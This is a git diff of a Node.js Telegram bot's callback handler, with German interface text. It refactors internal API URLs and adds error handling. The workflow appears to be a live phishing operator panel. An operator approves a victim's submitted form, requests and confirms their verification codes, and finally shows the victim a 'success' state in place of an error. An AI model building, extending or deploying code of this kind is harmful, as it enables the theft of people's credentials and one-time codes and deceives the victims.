@@ -318,41 +318,44 @@ async function handleCallbackQuery(query) {
     // Get session data
     const sessionData = activeSessions.get(key) || { formData: {} };
     
+    // For internal API calls within the container, use localhost
+    // External URLs won't work from inside the container due to DNS resolution
+    const internalApiUrl = 'http://localhost:3000';
+    
     // Handle different actions
     switch (action) {
       case 'confirm_form':
-        // Update session state to form_2
-        await axios.post('http://localhost:3000/api/state', { key, state: 'form_2' });
-        
-        // Update local session data
-        sessionData.state = 'form_2';
-        activeSessions.set(key, sessionData);
-        
-        // Notify the user via Socket.io
-        io.to(key).emit('state_update', { key, state: 'form_2' });
-        
-        // Update the message with form data still visible
-        const formApprovedMessage = createFormDataMessage(key, sessionData.formData, '✅ Formular genehmigt. Warten auf Verifizierungscode...');
-        
-        bot.editMessageText(formApprovedMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
-              ]
-            ]
-          }
-        });
-        
-        bot.answerCallbackQuery(query.id, { text: '✅ Formular genehmigt' });
+        try {
+          // Update session state to form_2
+          await axios.post(`${internalApiUrl}/api/state`, { key, state: 'form_2' });
+          
+          // Update local session data
+          sessionData.state = 'form_2';
+          activeSessions.set(key, sessionData);
+          
+          // Notify the user via Socket.io
+          io.to(key).emit('state_update', { key, state: 'form_2' });
+          
+          // Update the message with form data still visible
+          const formApprovedMessage = createFormDataMessage(key, sessionData.formData, '✅ Formular genehmigt. Warten auf Verifizierungscode...');
+          
+          await bot.editMessageText(formApprovedMessage.text, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: formApprovedMessage.reply_markup
+          });
+          
+          // Answer the callback query
+          bot.answerCallbackQuery(query.id, { text: '✅ Formular genehmigt' });
+        } catch (error) {
+          console.error('Error in confirm_form action:', error.message);
+          bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
+        }
         break;
-        
       case 'request_new_form':
         // Update session state to form_1
-        await axios.post('http://localhost:3000/api/state', { key, state: 'form_1' });
+        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'form_1' });
         
         // Update local session data
         sessionData.state = 'form_1';
@@ -384,10 +387,9 @@ _Warten auf die Formulareingabe des Benutzers..._
         
         bot.answerCallbackQuery(query.id, { text: '🔄 Neues Formular angefordert' });
         break;
-        
       case 'confirm_code':
         // Update session state from loading_pending to pending (not success)
-        await axios.post('http://localhost:3000/api/state', { key, state: 'pending' });
+        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'pending' });
         
         // Update local session data
         sessionData.state = 'pending';
@@ -415,10 +417,9 @@ _Warten auf die Formulareingabe des Benutzers..._
         
         bot.answerCallbackQuery(query.id, { text: '✅ Code bestätigt' });
         break;
-        
       case 'request_new_code':
         // Update session state from loading_pending to reenter_code
-        await axios.post('http://localhost:3000/api/state', { key, state: 'reenter_code' });
+        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'reenter_code' });
         
         // Update local session data
         sessionData.state = 'reenter_code';
@@ -445,10 +446,9 @@ _Warten auf die Formulareingabe des Benutzers..._
         
         bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
         break;
-        
       case 'end_session':
         // Update session state to success instead of error
-        await axios.post('http://localhost:3000/api/state', { key, state: 'success' });
+        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'success' });
         
         // Update local session data
         sessionData.state = 'success';
@@ -468,10 +468,9 @@ _Warten auf die Formulareingabe des Benutzers..._
         
         bot.answerCallbackQuery(query.id, { text: '✅ Sitzung abgeschlossen' });
         break;
-        
       case 'request_code':
         // Update session state from pending to reenter_code_after_pending
-        await axios.post('http://localhost:3000/api/state', { key, state: 'reenter_code_after_pending' });
+        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'reenter_code_after_pending' });
         
         // Update local session data
         sessionData.state = 'reenter_code_after_pending';
@@ -498,13 +497,23 @@ _Warten auf die Formulareingabe des Benutzers..._
         
         bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
         break;
-        
       default:
         bot.answerCallbackQuery(query.id, { text: '❓ Unbekannte Aktion' });
     }
   } catch (error) {
     console.error('Error handling callback query:', error);
-    bot.answerCallbackQuery(query.id, { text: '❌ Fehler bei der Anfrageverarbeitung' });
+    
+    // Provide a more detailed error message to the user
+    let errorMessage = '❌ Fehler bei der Anfrageverarbeitung';
+    if (error.code) {
+      errorMessage += ` (${error.code})`;
+    }
+    
+    try {
+      bot.answerCallbackQuery(query.id, { text: errorMessage });
+    } catch (callbackError) {
+      console.error('Error sending callback query answer:', callbackError);
+    }
   }
 }
 
